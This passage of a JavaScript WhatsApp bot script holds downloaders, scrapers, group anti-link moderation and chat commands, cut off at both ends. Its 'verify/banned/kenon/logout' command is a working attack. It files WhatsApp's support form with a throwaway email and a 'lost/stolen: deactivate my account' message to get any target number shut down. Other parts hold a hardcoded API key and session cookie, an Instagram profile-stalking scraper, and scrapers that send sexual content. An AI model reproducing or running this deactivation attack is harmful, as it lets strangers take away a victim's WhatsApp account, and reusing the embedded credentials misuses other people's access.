"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await yudamods.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await yudamods.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
yudamods.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("Result is not a buffer")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return yudamods.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`This feature is specifically for premium user, contact the owner to become premium user`)
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await yudamods.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await yudamods.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await yudamods.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return yudamods.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return yudamods.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (TzyTheCreator) return yudamods.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        kice = m.sender
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			yudamods.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

 // Antiwame  by Fxyz
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
kice = m.sender
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
kice = m.sender
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex  by Fxyz
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			yudamods.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words  by Fxyz
if (antiToxic)
if (BadTzy.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by YudaMods
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by YudaMods
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by YudaMods
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by YudaMods
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by YudaMods
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by YudaMods
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by YudaMods
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by YudaMods
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (TzyTheCreator) return m.reply(bvl)
        await yudamods.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			yudamods.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
yudamods.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
yudamods.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
yudamods.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadyyudamodsList(chath, dblist)) {
var getraindata = getDatayudamodsList(chath, dblist)
if (getraindata.isImage === false) {
yudamods.sendMessage(m.chat, { text: sendyudamodsList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getraindata.image_url)
yudamods.sendImage(m.chat, buff, `${getraindata.response}`, m)
}
}

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: yudamods.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, yudamods.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
yudamods.ev.emit('messages.upsert', msg)
}
//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
yudamods.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

switch (command) {
	case 'public': {
                if (!TzyTheCreator) return replygcTzy(mess.owner)
                yudamods.public = true
                replygcTzy('*Successful in Changing To Public Usage*')
            }
            break
            case 'self': {
                if (!TzyTheCreator) return replygcTzy(mess.owner)
                yudamods.public = false
                replygcTzy('*Successful in Changing To Self Usage*')
            }
            break
            case 'qc': case'text': {
    if (!args[0] && !m.quoted) {
      return replygcTzy(`Where is the text?`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await yudamods.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await yudamods.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      yudamods.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      replygcTzy('Error')
    }
    }
    break
        case 'daftar':
                if (isRegistered) return replygcTzy('Kamu sudah terdaftar')
                if (!q.includes('|')) return replygcTzy('Format salah!')
                const namaUser = q.substring(0, q.indexOf('|') - 0)
                const umurUser = q.substring(q.lastIndexOf('|') + 1)
                const serialUser = createSerial(20)
                if(isNaN(umurUser)) return replygcTzy('Umur harus berupa angka!!')
                if (namaUser.length >= 30) return replygcTzy(`why is your name so long it's a name or a train`)
                if (umurUser > 40) return replygcTzy(`your age is too  old maximum 40 years`)
                if (umurUser < 12) return replygcTzy(`your age is too young minimum 12 years`)
				mzd = `Kamu telah terdaftar dengan informasi sebagai berikut:\n\n⭔ Nama : ${namaUser}\n⭔ Umur : ${umurUser}\n⭔ Nomor : wa.me/${m.sender.split("@")[0]}\n⭔ NS : ${serialUser}`
               thumb = fs.readFileSync("./TzyMedia/theme/cheemspic.jpg")
                veri = m.sender
                if (!m.isGroup) {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    yudamods.sendMessage(m.chat, {image: thumb, caption: mzd}, {quoted: m})
                    
                } else {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    yudamods.sendMessage(m.chat, {image: thumb, caption: mzd}, {quoted: m})
                    
                }
		break
        
        case 'paptt':
            if (!isPrem && !TzyTheCreator) return replygcTzy(mess.prem)
            if (!q) return replygcTzy(`Example ${prefix + command} foto/video`)
            let papttfoto = JSON.parse(fs.readFileSync('./database/foto.json'))
            let papttvideo = JSON.parse(fs.readFileSync('./database/video.json'))
            let titid1 = (pickRandom(papttfoto))
            let titid2 = (pickRandom(papttvideo))
            if (q == 'foto') {
                replygcTzy("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
                yudamods.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            } else if (q == 'video') {
                replygcTzy("Video Akan Dikirim Lewat Private Chat ( *PC* )")
                yudamods.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            }
        break
case "backup":
        {
          if (!TzyTheCreator) replygcTzy("Khusus Owner Anj!!!"); 
     await replygcTzy("Sabar Mas Lagi Backup!!!");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "session" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r New.zip ${ls.join(" ")}`);
          await yudamods.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./New.zip"),
              mimetype: "application/zip",
              fileName: "New.zip",
            },
            { quoted: m }
          );
          await execSync("rm -rf NewV7.zip");
        }
        break
case "createqr": {
const qrcode = require('qrcode')
if (!text) return reply(`Penggunaan Salah Harusnya ${prefix+command} YudaMods`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
yudamods.sendMessage(from, { image: data, caption: `Sukses Kak` }, { quoted: m })
}
break
case "detectqr": {
try {
mee = await yudamods.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
const res = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res.json() 
reply(util.format(data[0].symbol))
} catch (err) {
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break
case 'rentbot': {
if (m.isGroup) return replygcTzy(mess.private)
if (!isPrem) return replyprem(mess.premium)
rentfromTzy(yudamods, m, from)
}
break
case 'rentbotlist': 
try {
let user = [... new Set([...global.conns.filter(yudamods => yudamods.user).map(yudamods => yudamods.user)])]
te = "*Rentbot List*\n\n"
for (let i of user){
y = await yudamods.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
yudamods.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcTzy(`There are no users who have rented the bot yet`)
}
break
case 'idgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await yudamods.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 yudamods.sendTextWithMentions(m.chat, teks, m)
             }
             break
 case 'verify': case 'banned': case 'kenon': case 'logout': {
 if (!TzyTheCreator) return m.replygcTzy(`Khusus Owner`)
 if (!q) return m.replygcTzy(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`succes ${command} ke nomer tersebut\n
note :
jika no masih centang 2 atau aktif no tersebut sudah terkena ${command} sebelumnya....`)
            }
            break
            case 'ai': case 'openai':
try {
if (global.keyopenai === '') return replygcTzy("Api key limi exceeded");
if (!q) return replygcTzy(`Chat with AI.\n\nExample:\n${prefix + command} What is coding`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
replygcTzy(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
replygcTzy("Sorry, there seems to be an error :"+ error.message);
}
}
break
case "aimage":
try {
